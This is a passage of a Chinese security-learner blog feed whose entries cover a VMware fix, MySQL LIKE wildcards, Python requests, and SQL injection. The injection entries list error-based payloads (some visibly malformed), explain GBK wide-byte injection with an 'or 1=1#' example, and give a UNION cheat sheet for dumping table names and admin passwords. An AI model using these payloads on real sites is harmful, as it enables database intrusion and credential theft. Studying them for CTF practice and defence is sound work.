    <content type="html"><![CDATA[<h4 id="vm黑屏解决方案"><a href="#vm黑屏解决方案" class="headerlink" title="vm黑屏解决方案"></a>vm黑屏解决方案</h4><p>本人是游戏本，打开vmware经常报错套接次数问题，重启服务后以后还是会出现问题<br>后来百度一下找到解决方案<br><br><a id="more"></a><br><a href="https://jingyan.baidu.com/article/84b4f565bd1da060f6da3235.html?qq-pf-to=pcqq.group" target="_blank" rel="noopener">黑屏解决方案网址</a><br><br><br>简单来说以管理员身份运行cmd，输入如下命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh winsock reset</span><br></pre></td></tr></table></figure></p><p>重新启动计算机即可解决</p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;vm黑屏解决方案&quot;&gt;&lt;a href=&quot;#vm黑屏解决方案&quot; class=&quot;headerlink&quot; title=&quot;vm黑屏解决方案&quot;&gt;&lt;/a&gt;vm黑屏解决方案&lt;/h4&gt;&lt;p&gt;本人是游戏本，打开vmware经常报错套接次数问题，重启服务后以后还是会出现问题&lt;br&gt;后来百度一下找到解决方案&lt;br&gt;&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SQL 报错注入</title>
    <link href="http://yoursite.com/2018/07/06/sql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2018/07/06/sql报错注入/</id>
    <published>2018-07-06T05:24:35.601Z</published>
    <updated>2018-07-06T10:43:14.889Z</updated>
    
    <content type="html"><![CDATA[<p>参考链接:<a href="http://www.bugku.com/forum.php?mod=viewthread&amp;tid=93&amp;extra=page%3D1%26filter%3Dtypeid%26typeid%3D26" target="_blank" rel="noopener">SQL报错注入十二个函数</a></p><h2 id="SQL报错注入的十二个函数"><a href="#SQL报错注入的十二个函数" class="headerlink" title="SQL报错注入的十二个函数"></a>SQL报错注入的十二个函数</h2><a id="more"></a><h3 id="0x01-floor报错"><a href="#0x01-floor报错" class="headerlink" title="0x01 floor报错"></a>0x01 floor报错</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure><h3 id="0x02-ExtractValue报错"><a href="#0x02-ExtractValue报错" class="headerlink" title="0x02 ExtractValue报错"></a>0x02 ExtractValue报错</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</span><br></pre></td></tr></table></figure><h3 id="0x03-UpdateXml报错"><a href="#0x03-UpdateXml报错" class="headerlink" title="0x03 UpdateXml报错"></a>0x03 UpdateXml报错</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=(updatexml(1,concat(0x3a,(select user())),1))</span><br></pre></td></tr></table></figure><h3 id="0x04-NAME-CONST报错"><a href="#0x04-NAME-CONST报错" class="headerlink" title="0x04 NAME_CONST报错"></a>0x04 NAME_CONST报错</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and exists(select*from (select*from(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)</span><br></pre></td></tr></table></figure><h3 id="0x05-join报错"><a href="#0x05-join报错" class="headerlink" title="0x05 join报错"></a>0x05 join报错</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from(select * from mysql.user ajoin mysql.user b)c;</span><br></pre></td></tr></table></figure><h3 id="0x06-exp报错"><a href="#0x06-exp报错" class="headerlink" title="0x06 exp报错"></a>0x06 exp报错</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and exp(~(select * from (select user () ) a) );</span><br></pre></td></tr></table></figure><h3 id="0x07-GeometryCollection-报错"><a href="#0x07-GeometryCollection-报错" class="headerlink" title="0x07 GeometryCollection()报错"></a>0x07 GeometryCollection()报错</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and GeometryCollection(()select *from(select user () )a)b );</span><br></pre></td></tr></table></figure><h3 id="0x08-polygon-报错"><a href="#0x08-polygon-报错" class="headerlink" title="0x08 polygon()报错"></a>0x08 polygon()报错</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and polygon (()select * from(select user ())a)b );</span><br></pre></td></tr></table></figure><h3 id="0x09-multipoint-报错"><a href="#0x09-multipoint-报错" class="headerlink" title="0x09 multipoint()报错"></a>0x09 multipoint()报错</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and multipoint (()select * from(select user() )a)b );</span><br></pre></td></tr></table></figure><h3 id="0x10-multlinestring-报错"><a href="#0x10-multlinestring-报错" class="headerlink" title="0x10 multlinestring()报错"></a>0x10 multlinestring()报错</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and multlinestring (()select * from(selectuser () )a)b );</span><br></pre></td></tr></table></figure><h3 id="0x11-multpolygon-报错"><a href="#0x11-multpolygon-报错" class="headerlink" title="0x11 multpolygon()报错"></a>0x11 multpolygon()报错</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and multpolygon (()select * from(selectuser () )a)b );</span><br></pre></td></tr></table></figure><h3 id="0x12-linestring-报错"><a href="#0x12-linestring-报错" class="headerlink" title="0x12 linestring()报错"></a>0x12 linestring()报错</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and linestring (()select * from(select user() )a)b );</span><br></pre></td></tr></table></figure><p>bugku上有个很好的测试平台 <a href="http://www.bugku.com/thread-152-1-1.html" target="_blank" rel="noopener">http://www.bugku.com/thread-152-1-1.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;参考链接:&lt;a href=&quot;http://www.bugku.com/forum.php?mod=viewthread&amp;amp;tid=93&amp;amp;extra=page%3D1%26filter%3Dtypeid%26typeid%3D26&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;SQL报错注入十二个函数&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;SQL报错注入的十二个函数&quot;&gt;&lt;a href=&quot;#SQL报错注入的十二个函数&quot; class=&quot;headerlink&quot; title=&quot;SQL报错注入的十二个函数&quot;&gt;&lt;/a&gt;SQL报错注入的十二个函数&lt;/h2&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MySql模糊查询</title>
    <link href="http://yoursite.com/2018/07/06/sqlmohu/"/>
    <id>http://yoursite.com/2018/07/06/sqlmohu/</id>
    <published>2018-07-06T05:24:35.601Z</published>
    <updated>2018-07-06T10:43:36.538Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MySql模糊查询的五种用法"><a href="#MySql模糊查询的五种用法" class="headerlink" title="MySql模糊查询的五种用法"></a>MySql模糊查询的五种用法</h2><h3 id="Mysql模糊查询用法之一-‘-’"><a href="#Mysql模糊查询用法之一-‘-’" class="headerlink" title="Mysql模糊查询用法之一    ‘%’"></a>Mysql模糊查询用法之一    ‘%’</h3><p>%：表示任意0个或多个字符。可匹配任意类型和长度的字符，有些情况下若是中文，请使用两个百分号（%%）表示(如果只有%表示不匹配,仍正确);<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM [user] WHERE u_name LIKE &apos;%三%&apos;</span><br></pre></td></tr></table></figure></p><p>将会把u_name为“张三”，“张猫三”、“三脚猫”，“唐三藏”等等有“三”的记录全找出来。<br>需要找出u_name中既有“三”又有“猫”的记录，请使用and条件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM [user] WHERE u_name LIKE &apos;%三%&apos; AND u_name LIKE &apos;%猫%&apos;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM [user] WHERE u_name LIKE &apos;%三%猫%&apos;</span><br></pre></td></tr></table></figure><p>虽然能搜索出“三脚猫”，但不能搜索出符合条件的“张猫三”。</p><h3 id="Mysql模糊查询用法之二-‘-’"><a href="#Mysql模糊查询用法之二-‘-’" class="headerlink" title="Mysql模糊查询用法之二   ‘_’"></a>Mysql模糊查询用法之二   ‘_’</h3><p>_： 表示任意单个字符。匹配单个任意字符，它常用来限制表达式的字符长度语句;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM [user] WHERE u_name LIKE &apos;_三_&apos;</span><br></pre></td></tr></table></figure><p>只找出“唐三藏”这样u_name为三个字且中间一个字是“三”的；</p><h3 id="Mysql模糊查询用法之三-‘-’"><a href="#Mysql模糊查询用法之三-‘-’" class="headerlink" title="Mysql模糊查询用法之三    ‘[ ]’"></a>Mysql模糊查询用法之三    ‘[ ]’</h3><p>[ ]：表示括号内所列字符中的一个（类似正则表达式）。指定一个字符、字符串或范围，要求所匹配对象为它们中的任一个。<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM [user] WHERE u_name LIKE &apos;[张李王]三&apos;</span><br></pre></td></tr></table></figure><p>会找出“张三”、“李三”、“王三”（而不是“张李王三”）;<br>如 [ ] 内有一系列字符（01234、abcde之类的）则可略写为“0-4”、“a-e” </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM [user] WHERE u_name LIKE &apos;老[1-9]&apos;</span><br></pre></td></tr></table></figure><p>将找出“老1”、“老2”、……、“老9”；</p><h3 id="Mysql模糊查询用法之四-‘-‘"><a href="#Mysql模糊查询用法之四-‘-‘" class="headerlink" title="Mysql模糊查询用法之四    ‘[^ ] ‘"></a>Mysql模糊查询用法之四    ‘[^ ] ‘</h3><p>[^ ] ：表示不在括号所列之内的单个字符。其取值和 [] 相同，但它要求所匹配对象为指定字符以外的任一个字符。<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM [user] WHERE u_name LIKE &apos;[^张李王]三&apos;</span><br></pre></td></tr></table></figure><p>将找出不姓“张”、“李”、“王”的“赵三”、“孙三”等;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM [user] WHERE u_name LIKE &apos;老[^1-4]&apos;;</span><br></pre></td></tr></table></figure><p>将排除“老1”到“老4”，寻找“老5”、“老6”、……</p><h3 id="Mysql模糊查询用法之五-查询内容包含通配符时"><a href="#Mysql模糊查询用法之五-查询内容包含通配符时" class="headerlink" title="Mysql模糊查询用法之五    查询内容包含通配符时"></a>Mysql模糊查询用法之五    查询内容包含通配符时</h3><p>由于通配符的缘故，导致我们查询特殊字符“%”、“_”、“[”的语句无法正常实现，而把特殊字符用“[ ]”括起便可正常查询。据此我们写出以下函数:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">function sqlencode(str) str=replace(str,&quot;&apos;;&quot;,&quot;&apos;;&apos;;&quot;) </span><br><span class="line">str=replace(str,&quot;[&quot;,&quot;[[]&quot;) &apos;;此句一定要在最先 str=replace(str,&quot;_&quot;,&quot;[_]&quot;) str=replace(str,&quot;%&quot;,&quot;[%]&quot;) sqlencode=str end function</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;MySql模糊查询的五种用法&quot;&gt;&lt;a href=&quot;#MySql模糊查询的五种用法&quot; class=&quot;headerlink&quot; title=&quot;MySql模糊查询的五种用法&quot;&gt;&lt;/a&gt;MySql模糊查询的五种用法&lt;/h2&gt;&lt;h3 id=&quot;Mysql模糊查询用法之一-‘-’&quot;&gt;&lt;a href=&quot;#Mysql模糊查询用法之一-‘-’&quot; class=&quot;headerlink&quot; title=&quot;Mysql模糊查询用法之一    ‘%’&quot;&gt;&lt;/a&gt;Mysql模糊查询用法之一    ‘%’&lt;/h3&gt;&lt;p&gt;%：表示任意0个或多个字符。可匹配任意类型和长度的字符，有些情况下若是中文，请使用两个百分号（%%）表示(如果只有%表示不匹配,仍正确);&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>sql宽字节注入原理</title>
    <link href="http://yoursite.com/2018/07/06/sqlkuanzijie/"/>
    <id>http://yoursite.com/2018/07/06/sqlkuanzijie/</id>
    <published>2018-07-06T05:24:35.601Z</published>
    <updated>2018-07-06T10:43:25.315Z</updated>
    
    <content type="html"><![CDATA[<h3 id="sql宽字节注入原理"><a href="#sql宽字节注入原理" class="headerlink" title="sql宽字节注入原理"></a>sql宽字节注入原理</h3><p>在magic_quotes_gpc=On的情况下，提交的参数中如果带有单引号’，就会被自动转义\’，使很多注入攻击无效.<br><a id="more"></a><br>GBK 一个汉字用两个字节表示<br><br>ASCII编码 占用一个字节<br><br>PHP中编码为GBK，函数执行添加的是ASCII编码，MYSQL默认字符集是GBK等宽字节字符集.</p><p>GBK双字节编码：一个汉字用两个字节表示，首字节对应0×81-0xFE，尾字节对应0×40-0xFE（除0×7F），刚好涵盖了转义符号\对应的编码0×5C。</p><p>0xD50×5C 对应了汉字“诚”，URL编码用百分号加字符的16进制编码表示字符，于是 %d5%5c 经URL解码后为“诚”。</p><h3 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h3><p>访问 <a href="http://www.2cto.com" target="_blank" rel="noopener">http://www.2cto.com</a> /test.php?username=test%d5′%20or%201=1%23&amp;pwd=test</p><p>经过浏览器编码，username参数值为(单引号的编码0×27)</p><p>username=test%d5%27%20or%201=1%23</p><p>经过php的url解码</p><p>username=test 0xd5 0×27 0×20 or 0×20 1=1 0×23 (为了便于阅读，在字符串与16进制编码之间加了空格)</p><p>经过PHP的GPC自动转义变成(单引号0×27被转义成\’对应的编码0×5c0×27)：</p><p>username=test 0xd5 0×5c 0×27 0×20 or 0×20 1=1 0×23</p><p>因为在数据库初始化连接的时候SET NAMES ‘gbk’，0xd50×5c解码后为诚，0×27解码为’，0×20为空格，0×23为mysql的注释符#</p><p>上面的SQL语句最终为： SELECT * FROM user WHERE username=’test诚’ or 1=1#’ and password=’test’;</p><p>注释符#后面的字符串已经无效，等价于</p><p>SELECT * FROM user WHERE username=’test诚’ or 1=1;</p><p>条件变成永真，成功注入。</p><h3 id="sql宽字节注入方法"><a href="#sql宽字节注入方法" class="headerlink" title="sql宽字节注入方法"></a>sql宽字节注入方法</h3><p>输入%df和函数执行添加的%5C，被合并成%df%5C。由于GBK是两字节，这个%df%5C被MYSQL识别为GBK。导致本应的%df\变成%df%5C。%df%5C在GBK编码中没有对应，所以被当成无效字符。</p><p>　　%DF’ ：会被PHP当中的addslashes函数转义为“%DF\’” ，“\”既URL里的“%5C”，那么也就是说，“%DF’”会被转成“%DF%5C%27”倘若网站的字符集是GBK，MYSQL使用的编码也是GBK的话，就会认为“%DF%5C%27”是一个宽字符。也就是“縗’”</p><p><a href="https://www.2cto.com/article/201209/153283.html" target="_blank" rel="noopener">sql宽字节原理</a></p><p><a href="https://www.cnblogs.com/xishaonian/p/6063961.html" target="_blank" rel="noopener">sql宽字节注入具体解释</a></p><p><a href="http://www.cnblogs.com/lcamry/articles/5625276.html" target="_blank" rel="noopener">sql宽字节注入详解</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;sql宽字节注入原理&quot;&gt;&lt;a href=&quot;#sql宽字节注入原理&quot; class=&quot;headerlink&quot; title=&quot;sql宽字节注入原理&quot;&gt;&lt;/a&gt;sql宽字节注入原理&lt;/h3&gt;&lt;p&gt;在magic_quotes_gpc=On的情况下，提交的参数中如果带有单引号’，就会被自动转义\’，使很多注入攻击无效.&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>sql</title>
    <link href="http://yoursite.com/2018/07/06/sql/"/>
    <id>http://yoursite.com/2018/07/06/sql/</id>
    <published>2018-07-06T05:24:35.586Z</published>
    <updated>2018-07-06T10:43:08.822Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-sql基础语句"><a href="#0x01-sql基础语句" class="headerlink" title="0x01 sql基础语句"></a>0x01 sql基础语句</h2><h3 id="爆字段长度"><a href="#爆字段长度" class="headerlink" title="爆字段长度"></a>爆字段长度</h3><p>Order by num </p><h3 id="匹配字段-爆字段位置"><a href="#匹配字段-爆字段位置" class="headerlink" title="匹配字段/爆字段位置"></a>匹配字段/爆字段位置</h3><p>and 1=1 union select 1,2,3,4,5……</p><h3 id="爆所有数据名"><a href="#爆所有数据名" class="headerlink" title="爆所有数据名"></a>爆所有数据名</h3><a id="more"></a><p>select group_concat(SCHEMA_NAME) from information_schema.schemata</p><h3 id="爆当前库的所有表"><a href="#爆当前库的所有表" class="headerlink" title="爆当前库的所有表"></a>爆当前库的所有表</h3><p>select group_concat(table_name) from information_schema.tables where table_schema=database() </p><h3 id="爆表中的字段名-将敏感的表进行16进制编码adminuser-0x61646D696E75736572"><a href="#爆表中的字段名-将敏感的表进行16进制编码adminuser-0x61646D696E75736572" class="headerlink" title="爆表中的字段名 将敏感的表进行16进制编码adminuser=0x61646D696E75736572"></a>爆表中的字段名 将敏感的表进行16进制编码adminuser=0x61646D696E75736572</h3><p>select group_concat(column_name) from information_schema.columns where table_name=0x61646D696E75736572</p><h3 id="爆字段具体的值"><a href="#爆字段具体的值" class="headerlink" title="爆字段具体的值"></a>爆字段具体的值</h3><p>select group_concat(username,0x3a,password) from adminuser</p><h2 id="0x02-sql的limit使用方法"><a href="#0x02-sql的limit使用方法" class="headerlink" title="0x02 sql的limit使用方法"></a>0x02 sql的limit使用方法</h2><p>1、下面是几种limit的方法：原则看看下面几个例子应该就懂了</p><p>在数据库中很多地方都会用到，比如当你数据库查询记录有几万、几十万时使用limit查询效率非常快，只需要查询出你需要的数据就可以了·再也不用全表查询导致查询数据库崩溃的情况。</p><p>select <em> from Customer LIMIT 10;–检索前10行数据，显示1-10条数据<br>select </em> from Customer LIMIT 1,10;–检索从第2行开始，累加10条id记录，共显示id为2….11<br>select <em> from Customer limit 5,10;–检索从第6行开始向前加10条数据，共显示id为6,7….15<br>select </em> from Customer limit 6,10;–检索从第7行开始向前加10条记录，显示id为7,8…16</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-sql基础语句&quot;&gt;&lt;a href=&quot;#0x01-sql基础语句&quot; class=&quot;headerlink&quot; title=&quot;0x01 sql基础语句&quot;&gt;&lt;/a&gt;0x01 sql基础语句&lt;/h2&gt;&lt;h3 id=&quot;爆字段长度&quot;&gt;&lt;a href=&quot;#爆字段长度&quot; class=&quot;headerlink&quot; title=&quot;爆字段长度&quot;&gt;&lt;/a&gt;爆字段长度&lt;/h3&gt;&lt;p&gt;Order by num &lt;/p&gt;
&lt;h3 id=&quot;匹配字段-爆字段位置&quot;&gt;&lt;a href=&quot;#匹配字段-爆字段位置&quot; class=&quot;headerlink&quot; title=&quot;匹配字段/爆字段位置&quot;&gt;&lt;/a&gt;匹配字段/爆字段位置&lt;/h3&gt;&lt;p&gt;and 1=1 union select 1,2,3,4,5……&lt;/p&gt;
&lt;h3 id=&quot;爆所有数据名&quot;&gt;&lt;a href=&quot;#爆所有数据名&quot; class=&quot;headerlink&quot; title=&quot;爆所有数据名&quot;&gt;&lt;/a&gt;爆所有数据名&lt;/h3&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Python爬虫requests的使用</title>
    <link href="http://yoursite.com/2018/07/06/requests/"/>
    <id>http://yoursite.com/2018/07/06/requests/</id>
    <published>2018-07-06T05:24:35.586Z</published>
    <updated>2018-07-06T10:42:49.374Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一些请求方式"><a href="#一些请求方式" class="headerlink" title="一些请求方式"></a>一些请求方式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">requests.post(&quot;http://httpbin.org/post&quot;)</span><br><span class="line">requests.put(&quot;http://httpbin.org/put&quot;)</span><br><span class="line">requests.delete(&quot;http://httpbin.org/delete&quot;)</span><br><span class="line">requests.head(&quot;http://httpbin.org/get&quot;)</span><br><span class="line">requests.options(&quot;http://httpbin.org/get&quot;)</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="基本GET的使用"><a href="#基本GET的使用" class="headerlink" title="基本GET的使用"></a>基本GET的使用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"> </span><br><span class="line">url = &apos;https://www.baidu.com/&apos;</span><br><span class="line">response = requests.get(url)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure><h3 id="带参数的GET请求"><a href="#带参数的GET请求" class="headerlink" title="带参数的GET请求"></a>带参数的GET请求</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果想查询http://httpbin.org/get页面的具体参数，需要在url里面加上，例如我想看有没有Host=httpbin.org这条数据，url形式应该是http://httpbin.org/get?Host=httpbin.org</span><br></pre></td></tr></table></figure><p>下面提交的数据是往这个地址传送data里面的数据。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"> </span><br><span class="line">url = &apos;http://httpbin.org/get&apos;</span><br><span class="line">data = &#123;</span><br><span class="line">    &apos;name&apos;:&apos;zhangsan&apos;,</span><br><span class="line">    &apos;age&apos;:&apos;25&apos;</span><br><span class="line">&#125;</span><br><span class="line">response = requests.get(url,params=data)</span><br><span class="line">print(response.url)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure></p><h3 id="添加header"><a href="#添加header" class="headerlink" title="添加header"></a>添加header</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">首先说，为什么要加header（头部信息）呢？例如下面，我们试图访问知乎的登录页面（当然大家都你要是不登录知乎，就看不到里面的内容），我们试试不加header信息会报什么错。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"> </span><br><span class="line">url = &apos;https://www.zhihu.com/&apos;</span><br><span class="line">response = requests.get(url)</span><br><span class="line">response.encoding = &quot;utf-8&quot;</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure><p>提示发生内部服务器错误（也就说你连知乎登录页面的html都下载不下来）。</p><p>如果想访问就必须得加headers信息。<br><br><img src="http://p1vrkwaxt.bkt.clouddn.com/976930-20170607160504559-312667404.png" alt="image"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"> </span><br><span class="line">url = &apos;https://www.zhihu.com/&apos;</span><br><span class="line">headers = &#123;</span><br><span class="line">    &apos;User-Agent&apos;:&apos;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36&apos;</span><br><span class="line">&#125;</span><br><span class="line">response = requests.get(url,headers=headers)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure></p><h3 id="基本POST请求"><a href="#基本POST请求" class="headerlink" title="基本POST请求"></a>基本POST请求</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过post把数据提交到url地址，等同于一字典的形式提交form表单里面的数据</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"> </span><br><span class="line">url = &apos;http://httpbin.org/post&apos;</span><br><span class="line">data = &#123;</span><br><span class="line">    &apos;name&apos;:&apos;jack&apos;,</span><br><span class="line">    &apos;age&apos;:&apos;23&apos;</span><br><span class="line">    &#125;</span><br><span class="line">response = requests.post(url,data=data)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure><p>结果如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;args&quot;: &#123;&#125;,</span><br><span class="line">  &quot;data&quot;: &quot;&quot;,</span><br><span class="line">  &quot;files&quot;: &#123;&#125;,</span><br><span class="line">  &quot;form&quot;: &#123;</span><br><span class="line">    &quot;age&quot;: &quot;23&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;jack&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;headers&quot;: &#123;</span><br><span class="line">    &quot;Accept&quot;: &quot;*/*&quot;,</span><br><span class="line">    &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,</span><br><span class="line">    &quot;Connection&quot;: &quot;close&quot;,</span><br><span class="line">    &quot;Content-Length&quot;: &quot;16&quot;,</span><br><span class="line">    &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,</span><br><span class="line">    &quot;Host&quot;: &quot;httpbin.org&quot;,</span><br><span class="line">    &quot;User-Agent&quot;: &quot;python-requests/2.13.0&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;json&quot;: null,</span><br><span class="line">  &quot;origin&quot;: &quot;118.144.137.95&quot;,</span><br><span class="line">  &quot;url&quot;: &quot;http://httpbin.org/post&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="requests的高级操作"><a href="#requests的高级操作" class="headerlink" title="requests的高级操作"></a>requests的高级操作</h2><h3 id="会话维持"><a href="#会话维持" class="headerlink" title="会话维持"></a>会话维持</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cookie的一个作用就是可以用于模拟登陆，做会话维持</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">session = requests.session()</span><br><span class="line">session.get(&apos;http://httpbin.org/cookies/set/number/12456&apos;)</span><br><span class="line">response = session.get(&apos;http://httpbin.org/cookies&apos;)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure><h3 id="获取cookie"><a href="#获取cookie" class="headerlink" title="获取cookie"></a>获取cookie</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">response = requests.get(&apos;https://www.baidu.com&apos;)</span><br><span class="line">print(response.cookies)</span><br><span class="line">for key,value in response.cookies.items():</span><br><span class="line">    print(key,&apos;==&apos;,value)</span><br></pre></td></tr></table></figure><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;http://httpbin.org/post&quot;</span><br><span class="line">files= &#123;&quot;files&quot;:open(&quot;test.jpg&quot;,&quot;rb&quot;)&#125;</span><br><span class="line">response = requests.post(url,files=files)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure><p><img src="http://p1vrkwaxt.bkt.clouddn.com/976930-20170607172923106-818596795.png" alt="image"></p><p>更多具体以后补上，先看看这个<br><br><a 